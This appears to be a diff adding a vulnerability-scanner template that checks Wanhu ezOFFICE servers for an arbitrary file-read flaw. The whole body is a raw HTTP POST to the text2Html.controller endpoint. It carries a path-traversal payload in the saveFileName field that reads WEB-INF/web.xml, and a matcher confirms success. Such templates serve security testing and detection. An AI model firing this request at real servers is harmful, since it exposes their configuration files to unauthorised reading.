@@ -1,0 +1,24 @@
+id: wanhu-ezoffice-text2Html-fileread
+
+info:
+  name: wanhu-ezoffice-text2Html-fileread
+  author: xxx
+  severity: high
+  description: -wanhu-ezoffice-text2Html-fileread
+  tags: wanhu,ezoffice,oa,fileread
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        SL-CE-SUID: 1081
+
+        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+
+    matchers:
+      - type: word
+        words:
+          - '/WEB-INF/struts-config/foregroundres-config.xml'
